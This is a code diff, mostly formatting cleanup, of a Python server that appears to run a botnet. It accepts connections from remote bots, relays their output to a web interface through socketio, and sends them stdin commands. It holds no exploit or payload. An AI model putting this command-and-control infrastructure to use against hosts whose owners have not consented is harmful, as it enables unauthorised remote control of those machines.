@@ -4,8 +4,10 @@ from threading import Thread, Condition
 from threading import Lock
 import select
 
-try: from server import formatsock
-except: import formatsock
+try:
+    from server import formatsock
+except:
+    import formatsock
 
 
 class BotNet(Thread):
@@ -21,7 +23,7 @@ class BotNet(Thread):
     def addConnection(self, user, conn):
         with self.connlock:
             if user in self.allConnections:
-                pass # TODO: How to deal with duplicate usernames?
+                pass  # TODO: How to deal with duplicate usernames?
             self.allConnections[user] = conn
             self.conncon.notifyAll()
             # Notify recv thread
@@ -29,11 +31,12 @@ class BotNet(Thread):
     def removeConnection(self, user):
         with self.connlock:
             if user in self.allConnections:
-                 # terminate and remove
+                # terminate and remove
+                del self.allConnections[user] #TODO: could cause sync issues
                 self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                 print("[-] Lost connection to {}".format(user))
 
-    def getConnection(self,user):
+    def getConnection(self, user):
         with self.connlock:
             if user in self.allConnections:
                 return self.allConnections[user]
@@ -52,7 +55,7 @@ class BotNet(Thread):
                     bots = list(self.allConnections.values())
             # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
             # TODO maybe use pipe as interrupt instead of timeout?
-            rs, _, _ = select.select(bots,[],[],BotNet.INPUT_TIMEOUT)
+            rs, _, _ = select.select(bots, [], [], BotNet.INPUT_TIMEOUT)
             # We now have a tuple of all bots that have sent data to the botnet
             for bot in rs:
                 user = bot.user
@@ -61,7 +64,7 @@ class BotNet(Thread):
                     # TODO: emit/broadcast this message to anyone on the <user> channel/room
                     jsonobj = json.loads(msg.decode('UTF-8'))
                     jsonobj['user'] = user
-                    self.socketio.emit('response', jsonobj,namespace="/bot")
+                    self.socketio.emit('response', jsonobj, namespace="/bot")
                 except IOError:
                     # Connection was interrupted
                     # TODO: inform users
@@ -85,12 +88,13 @@ class BotServer(Thread):
 
             user = host_info['user'].strip()
             print("[+] Received connection from {}".format(user))
-            self.botnet.addConnection(user,Bot(clientsock, host_info))
+            self.botnet.addConnection(user, Bot(clientsock, host_info))
 
             self.socketio.emit('connection', {'user': user}, namespace='/bot')
 
             # To test continuous stream, stdout is broken into multiple packets, hangs when waiting
             # self.botnet.getConnection(user).sendStdin('find /usr/local/lib\n')
+
 
 class Bot:
     def __init__(self, sock, host_info):
@@ -99,7 +103,7 @@ class Bot:
         self.user = host_info['user'][:-1]
 
     def send(self, cmd, type="stdin"):
-        json_str = json.dumps({type:cmd})
+        json_str = json.dumps({type: cmd})
         self.sock.send(json_str)
 
     def sendStdin(self, cmd):
